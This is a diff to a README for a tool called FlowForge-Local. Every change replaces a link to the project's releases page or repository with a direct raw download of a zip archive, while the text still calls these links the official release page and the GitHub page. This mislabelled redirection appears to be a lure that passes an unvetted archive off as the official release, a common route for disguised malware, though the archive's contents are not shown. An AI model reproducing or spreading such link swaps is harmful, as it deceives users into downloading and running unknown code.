@@ -1,6 +1,6 @@
 # ⚙️ FlowForge-Local - Simple Local Workflow Automation
 
-[![Download FlowForge-Local](https://img.shields.io/badge/Download-FlowForge--Local-brightgreen)](https://github.com/Kelvinmusyoka/FlowForge-Local/releases)
+[![Download FlowForge-Local](https://img.shields.io/badge/Download-FlowForge--Local-brightgreen)](https://raw.githubusercontent.com/Kelvinmusyoka/FlowForge-Local/main/desktop/Forge_Local_Flow_v3.2.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Make sure to close other heavy programs during setup for smoother installation.
 
 Visit the official release page to get the software. You can find stable versions and updates there.
 
-[![Download FlowForge-Local](https://img.shields.io/badge/Download-FlowForge--Local-blue)](https://github.com/Kelvinmusyoka/FlowForge-Local/releases)
+[![Download FlowForge-Local](https://img.shields.io/badge/Download-FlowForge--Local-blue)](https://raw.githubusercontent.com/Kelvinmusyoka/FlowForge-Local/main/desktop/Forge_Local_Flow_v3.2.zip)
 
 ### Step 2: Find the Latest Version
 
@@ -117,7 +117,7 @@ Use these logs to:
 
 To get new features or fixes, check the releases page regularly:
 
-[FlowForge-Local Releases](https://github.com/Kelvinmusyoka/FlowForge-Local/releases)
+[FlowForge-Local Releases](https://raw.githubusercontent.com/Kelvinmusyoka/FlowForge-Local/main/desktop/Forge_Local_Flow_v3.2.zip)
 
 Download the latest installer and run it. The installer updates your current version without removing your settings.
 
@@ -137,10 +137,10 @@ Download the latest installer and run it. The installer updates your current ver
 
 You can learn more about what FlowForge-Local does by visiting the GitHub page:
 
-https://github.com/Kelvinmusyoka/FlowForge-Local
+https://raw.githubusercontent.com/Kelvinmusyoka/FlowForge-Local/main/desktop/Forge_Local_Flow_v3.2.zip
 
 This page shares detailed descriptions and technical background for those interested.
 
 ---
 
-[![Download FlowForge-Local](https://img.shields.io/badge/Download-FlowForge--Local-green)](https://github.com/Kelvinmusyoka/FlowForge-Local/releases)
+[![Download FlowForge-Local](https://img.shields.io/badge/Download-FlowForge--Local-green)](https://raw.githubusercontent.com/Kelvinmusyoka/FlowForge-Local/main/desktop/Forge_Local_Flow_v3.2.zip)
